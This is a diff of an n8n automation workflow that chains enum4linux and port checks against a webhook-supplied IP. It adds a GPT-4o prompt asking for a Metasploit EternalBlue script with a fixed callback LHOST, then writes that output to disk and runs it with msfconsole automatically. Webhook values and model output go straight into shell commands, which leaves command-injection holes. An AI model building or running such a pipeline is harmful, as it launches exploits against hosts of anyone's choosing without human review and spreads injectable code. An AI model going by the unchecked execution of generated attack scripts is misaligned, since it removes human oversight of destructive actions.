@@ -29,11 +29,12 @@
       ],
       "id": "b2187a1a-c650-49a4-87cf-36beb80b50d9",
       "typeVersion": 1,
+      "alwaysOutputData": false,
       "onError": "continueRegularOutput"
     },
     {
       "parameters": {
-        "command": "enum4linux -a {{$json[\"query\"].target_ip}}"
+        "command": "=enum4linux -a  {{ $('Webhook Trigger').item.json.body.target_ip }}"
       },
       "name": "Run Enum4Linux",
       "type": "n8n-nodes-base.executeCommand",
@@ -108,7 +109,7 @@
           "conditions": [
             {
               "id": "f755812c-b7c6-474b-892e-683583cd3c92",
-              "leftValue": "={{ $json.stdout }}",
+              "leftValue": "={{ $json.received.result }}",
               "rightValue": "445/tcp",
               "operator": {
                 "type": "string",
@@ -117,7 +118,7 @@
             },
             {
               "id": "1858a3db-0cbb-4e00-b847-da78c42fa64c",
-              "leftValue": "={{ $json.stdout }}",
+              "leftValue": "={{ $json.received.result }}",
               "rightValue": "135/tcp",
               "operator": {
                 "type": "string",
@@ -181,7 +182,7 @@
       "type": "n8n-nodes-base.executeCommand",
       "typeVersion": 1,
       "position": [
-        -1360,
+        -1240,
         260
       ],
       "id": "649b79ba-414c-4a55-910f-b2e27f34c72a",
@@ -218,87 +219,11 @@
       "type": "n8n-nodes-base.if",
       "typeVersion": 2.2,
       "position": [
-        -440,
-        180
+        -580,
+        200
       ],
       "id": "9a01c494-d067-4bb6-839b-a2d1fb6299a6",
       "name": "WebCheck"
-    },
-    {
-      "parameters": {
-        "command": "cat /home/kali/Mallanoo_Agent/nmap_scan.txt"
-      },
-      "type": "n8n-nodes-base.executeCommand",
-      "typeVersion": 1,
-      "position": [
-        -620,
-        500
-      ],
-      "id": "16dc9d1c-5866-4c48-9932-c1f59a4efbc4",
-      "name": "NmapRead1"
-    },
-    {
-      "parameters": {
-        "method": "POST",
-        "url": "http://localhost:3000/api/send-scan",
-        "sendBody": true,
-        "bodyParameters": {
-          "parameters": [
-            {}
-          ]
-        },
-        "options": {}
-      },
-      "type": "n8n-nodes-base.httpRequest",
-      "typeVersion": 4.2,
-      "position": [
-        20,
-        -160
-      ],
-      "id": "ce054b96-2e00-4bf1-97c0-3e3c028141df",
-      "name": "HTTP Request2"
-    },
-    {
-      "parameters": {
-        "method": "POST",
-        "url": "http://localhost:3000/api/send-scan",
-        "sendBody": true,
-        "bodyParameters": {
-          "parameters": [
-            {}
-          ]
-        },
-        "options": {}
-      },
-      "type": "n8n-nodes-base.httpRequest",
-      "typeVersion": 4.2,
-      "position": [
-        -80,
-        180
-      ],
-      "id": "11601809-4063-44af-8f3f-ad4d1ab4ee41",
-      "name": "HTTP Request3"
-    },
-    {
-      "parameters": {
-        "method": "POST",
-        "url": "http://localhost:3000/api/send-scan",
-        "sendBody": true,
-        "bodyParameters": {
-          "parameters": [
-            {}
-          ]
-        },
-        "options": {}
-      },
-      "type": "n8n-nodes-base.httpRequest",
-      "typeVersion": 4.2,
-      "position": [
-        200,
-        180
-      ],
-      "id": "2ac14ad2-20c9-4352-9fb0-b5b9f44158c2",
-      "name": "HTTP Request4"
     },
     {
       "parameters": {
@@ -323,30 +248,6 @@
       ],
       "id": "20ab0ea9-dfb4-4eeb-b545-08d59efee46a",
       "name": "PingOutput"
-    },
-    {
-      "parameters": {
-        "method": "POST",
-        "url": "http://localhost:3000/api/submit",
-        "sendBody": true,
-        "bodyParameters": {
-          "parameters": [
-            {
-              "name": "result",
-              "value": "={{ $json.stdout }}"
-            }
-          ]
-        },
-        "options": {}
-      },
-      "type": "n8n-nodes-base.httpRequest",
-      "typeVersion": 4.2,
-      "position": [
-        -440,
-        500
-      ],
-      "id": "003cae1a-82db-4da0-8506-b48494077d7a",
-      "name": "NMAPOutput"
     },
     {
       "parameters": {
@@ -399,6 +300,76 @@
       "id": "692ce3f4-4691-4f76-b108-09a47ad42e12",
       "name": "Wait1",
       "webhookId": "70f9692a-13b1-4752-913c-7d28ff4d6456"
+    },
+    {
+      "parameters": {
+        "modelId": {
+          "__rl": true,
+          "value": "gpt-4o",
+          "mode": "list",
+          "cachedResultName": "GPT-4O"
+        },
+        "messages": {
+          "values": [
+            {
+              "content": "=You are an expert penetration tester. Based on the following vulnerability scan results, generate a full Metasploit `.rc` script.\n\nNmap Scan Results:\n{{$json[\"stdout\"]}}\n\nEnum4Linux Scan Results:\n{{$json[\"stdout\"]}}\n\nGenerate the `.rc` script with:\n1. Exploit modules\n2. Payload configuration\n3. Target settings\n4. Use Eternalblue as a payload\n5. LHOST is 10.10.14.3\n6. RHOST is {{ $('Webhook Trigger').item.json.body.target_ip }}\n\nReturn only the Metasploit `.rc` script in this format: "
+            }
+          ]
+        },
+        "jsonOutput": true,
+        "options": {}
+      },
+      "type": "@n8n/n8n-nodes-langchain.openAi",
+      "typeVersion": 1.8,
+      "position": [
+        -160,
+        -140
+      ],
+      "id": "8d548cc1-8355-4f37-8de3-6ab23631af64",
+      "name": "OpenAI",
+      "credentials": {
+        "openAiApi": {
+          "id": "f6JJyqt0w3YlPALO",
+          "name": "OpenAi account"
+        }
+      }
+    },
+    {
+      "parameters": {
+        "method": "POST",
+        "url": "http://localhost:3000/api/submit",
+        "sendBody": true,
+        "bodyParameters": {
+          "parameters": [
+            {
+              "name": "result",
+              "value": "={{ $json.message.content.commands }}"
+            }
+          ]
+        },
+        "options": {}
+      },
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4.2,
+      "position": [
+        260,
+        -340
+      ],
+      "id": "27845399-2a74-487a-a936-f2c6b41a1952",
+      "name": "NMAPOutput"
+    },
+    {
+      "parameters": {
+        "command": "=echo \"{{ $json.message.content.commands }}\" > /home/kali/Mallanoo_Agent/metasploit_script.rc\nmsfconsole -q -r /home/kali/Mallanoo_Agent/metasploit_script.rc"
+      },
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [
+        480,
+        -140
+      ],
+      "id": "19b8d86e-7abc-4421-9ed6-fcd7b68e5f68",
+      "name": "Execute Command"
     }
   ],
   "pinData": {},
@@ -429,7 +400,7 @@
       "main": [
         [
           {
-            "node": "NmapRead1",
+            "node": "NmapRead",
             "type": "main",
             "index": 0
           }
@@ -440,7 +411,7 @@
       "main": [
         [
           {
-            "node": "HTTP Request2",
+            "node": "OpenAI",
             "type": "main",
             "index": 0
           }
@@ -456,13 +427,7 @@
             "index": 0
           }
         ],
-        [
-          {
-            "node": "WebCheck",
-            "type": "main",
-            "index": 0
-          }
-        ]
+        []
       ]
     },
     "NmapCheck1": {
@@ -470,6 +435,11 @@
         [
           {
             "node": "SMBCheck",
+            "type": "main",
+            "index": 0
+          },
+          {
+            "node": "WebCheck",
             "type": "main",
             "index": 0
           }
@@ -509,44 +479,6 @@
       "main": [
         [
           {
-            "node": "HTTP Request3",
-            "type": "main",
-            "index": 0
-          }
-        ]
-      ]
-    },
-    "Run MagicRecon": {
-      "main": [
-        [
-          {
-            "node": "HTTP Request4",
-            "type": "main",
-            "index": 0
-          }
-        ]
-      ]
-    },
-    "NmapRead1": {
-      "main": [
-        []
-      ]
-    },
-    "HTTP Request2": {
-      "main": [
-        [
-          {
-            "node": "Run Metasploit Exploit",
-            "type": "main",
-            "index": 0
-          }
-        ]
-      ]
-    },
-    "HTTP Request3": {
-      "main": [
-        [
-          {
             "node": "Run MagicRecon",
             "type": "main",
             "index": 0
@@ -554,7 +486,7 @@
         ]
       ]
     },
-    "HTTP Request4": {
+    "Run MagicRecon": {
       "main": [
         [
           {
@@ -570,17 +502,6 @@
         [
           {
             "node": "Wait",
-            "type": "main",
-            "index": 0
-          }
-        ]
-      ]
-    },
-    "NMAPOutput": {
-      "main": [
-        [
-          {
-            "node": "Wait1",
             "type": "main",
             "index": 0
           }
@@ -619,13 +540,29 @@
           }
         ]
       ]
+    },
+    "OpenAI": {
+      "main": [
+        [
+          {
+            "node": "NMAPOutput",
+            "type": "main",
+            "index": 0
+          },
+          {
+            "node": "Execute Command",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
     }
   },
   "active": false,
   "settings": {
     "executionOrder": "v1"
   },
-  "versionId": "fa7bf9d6-dbea-4c3e-9f36-04b174770967",
+  "versionId": "b91ff6e4-af1f-4145-82a5-55b633d9b4c0",
   "meta": {
     "templateCredsSetupCompleted": true,
     "instanceId": "6965eed6430514894118c88706fa2afabaeca3708ee375316c9e218033edbd9b"
